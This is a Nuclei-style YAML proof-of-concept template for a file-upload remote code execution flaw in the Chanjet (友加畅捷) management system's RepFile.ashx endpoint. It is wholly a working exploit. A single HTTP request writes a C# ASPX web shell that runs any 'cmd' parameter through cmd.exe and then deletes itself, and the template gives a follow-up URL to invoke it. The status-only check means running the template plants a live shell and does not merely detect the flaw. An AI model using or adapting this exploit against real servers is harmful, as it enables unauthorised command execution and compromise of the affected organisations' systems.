id: poc-ylokts09aybos2bh
info:
  name: 友加畅捷管理系统 RepFile.ashx 存在文件上传致RCE漏洞
  author: hacktwo
  severity: high
  description: ''
  tags: rce,file-upload,2025
http:
- raw:
  - "POST /ReportDesign/RepFile.ashx?RepFile=pages/rce.aspx&Type=SaveRepFileData HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36\nSOAPAction:\nContent-Type: application/x-www-form-urlencoded\n\n<script runat=\"server\" language=\"C#\">\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        Response.Clear();\n        Response.ContentType = \"text/plain\";\n        try\n        {\n            string command = Request[\"cmd\"];\n            if (string.IsNullOrEmpty(command))\n            {\n                return;\n            }\n            System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();\n            psi.FileName = \"cmd.exe\";\n            psi.Arguments = \"/c \" + command;\n            psi.RedirectStandardOutput = true;\n            psi.UseShellExecute = false;\n            psi.CreateNoWindow = true;\n            using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(psi))\n            {\n                using (System.IO.StreamReader reader = process.StandardOutput)\n                {\n                    string result = reader.ReadToEnd();\n                    Response.Write(result);\n                }\n            }\n        }\n        catch (System.Exception ex)\n        {\n            Response.Write(\"Error executing command: \" + ex.Message + \"\\n\");\n            Response.Write(ex.StackTrace);\n        }\n        finally\n        {\n            try\n            {\n                string filePath = Server.MapPath(Request.ServerVariables[\"SCRIPT_NAME\"]);\n                System.IO.File.Delete(filePath);\n            }\n            catch { }\n\n            Response.End();\n        }\n    }\n</script>\n\n**验证路径**\n/Report/Pages/rce.aspx?cmd=dir"
  redirects: false
  matchers:
  - status:
    - 200
    type: status
